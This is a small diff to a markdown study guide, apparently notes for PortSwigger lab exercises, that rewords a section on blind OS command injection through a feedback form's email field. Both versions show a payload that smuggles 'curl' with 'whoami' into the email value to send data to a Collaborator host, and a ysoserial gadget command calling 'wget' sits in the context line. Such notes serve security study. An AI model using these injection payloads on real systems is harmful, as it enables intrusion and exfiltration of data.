@@ -2391,13 +2391,13 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
 
 ### Feedback  
 
->The target application **feedback** function require email parameter, and ***identifying*** for blind OS command injection by appending ```||curl COLLABORATOR.net||``` bash curl command and observing if request made to Collaborator.  
+>The target application **submit feedback** function require email value, and ***identifying*** blind OS command injection by appending ```||curl COLLABORATOR.net||``` bash command, we then can observe a request made to Collaborator.  
   
 ```bash
 email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 ```
 
-![os command injection](images/os-command-inject.png)  
+![OS command injection](images/os-command-inject.png)  
 
 [PortSwigger Lab: Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)  
  
